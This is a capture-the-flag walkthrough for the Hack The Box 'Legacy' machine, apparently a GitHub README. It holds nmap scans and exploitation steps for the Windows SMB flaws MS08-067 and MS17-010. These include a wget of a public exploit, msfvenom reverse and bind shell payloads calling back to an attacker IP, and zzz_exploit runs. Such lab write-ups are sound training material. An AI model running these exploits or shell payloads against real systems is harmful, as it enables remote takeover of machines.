# Legacy Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA legacy 10.10.10.4``
### AND 
``nmap --script vuln 10.10.10.4``

# ${{\color{purple}Initial Foothold}}\ $

``nmap --script vuln 10.10.10.4``

| smb-vuln-ms17-010:                                                                                                                                              
|   VULNERABLE:                                                                  
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                                                                                     
|     State: VULNERABLE                 
|     IDs:  CVE:CVE-2017-0143                                                                                                                                     
|     Risk factor: HIGH                 
|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                                                                  
|        servers (ms17-010).                                                                                                                                      
|                                                                                                                                                                            
| smb-vuln-ms08-067:                                                                                                                                              
|   VULNERABLE:                         
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)                                                                                       
|     State: VULNERABLE                 
|     IDs:  CVE:CVE-2008-4250                                                    
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,                                                            
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary                                                          
|           code via a crafted RPC request that triggers the overflow during path canonicalization.

# ${{\color{purple}Exploitation}}\ $

###  smb-vuln-ms08-067 

https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py

``wget https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py && chmod +x ms08-067.py``

### To know the OS and use the right option of the script you have to use this nmap command :


``nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.4``

### if the exact version doesn't come up, you have to use several options of the script like n°1,5,6,7 for windows XP

### We have to change the shellcode in the exploit :

``msfvenom -p windows/shell_bind_tcp RHOST=10.10.16.5 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows``

### OR 

``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows``

![image](https://user-images.githubusercontent.com/123066149/219029218-35a86849-f829-4449-931e-7892b00803c6.png)

### Modify the shellcode in the exploit :

![image](https://user-images.githubusercontent.com/123066149/219029627-bc940cd2-985b-4f9b-9597-52f9d7a9e07e.png)

``python ms08-067.py 10.10.10.4 6 445``

![image](https://user-images.githubusercontent.com/123066149/219029991-898620c3-7091-45a9-8021-183f3b50bb38.png)

It's possible to execute a different shellcode like a bind shell for example :

``msfvenom -p windows/shell_bind_tcp RHOST=10.10.10.4 LPORT=60001 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows``

![image](https://user-images.githubusercontent.com/123066149/219030430-e9266aaa-2df1-41a7-ab0c-77bff585d1c3.png)

``python ms08-067.py 10.10.10.4 6 445``

![image](https://user-images.githubusercontent.com/123066149/219030681-b233041e-15ba-4652-b40b-1e58a4e505fc.png)

### smb-vuln-ms17-010

git clone https://github.com/3ndG4me/AutoBlue-MS17-010

### The machine is also vulnerable to smb-vuln-ms17-010
### For the exploitation I used the scripts : Autoblu because they are the only ones to be python3+ compatible
### I used eternal_checker to find the named pipes

``python eternal_checker.py -target-ip 10.10.10.4 -port 445 htb.local``

![image](https://user-images.githubusercontent.com/123066149/219063977-ac520366-70fd-412c-b3b6-48a5421032ec.png)

### And I used the zzz exploit because it's the only one compatible with old OS :

``python zzz_exploit.py -target-ip 10.10.10.4 -port 445 -pipe browser htb.local``

![image](https://user-images.githubusercontent.com/123066149/219064409-85575f53-df8a-4d9f-b441-8b2bdb9d8a18.png)

# ${{\color{purple}Privilege Escalation}}\ $

### No priv esc services running as system

# ${{\color{purple}Point of Improvement}}\ $

* Don't hesitate to reset the machines if the exploit doesn't work, after a bad attempt.
* The machine is no longer exploitable if there is a bad attempt.
* Named pipes are a way for running processes to communicate with each other with very little overhead.
* Pipes usually appear as files for other processes to attach to. 
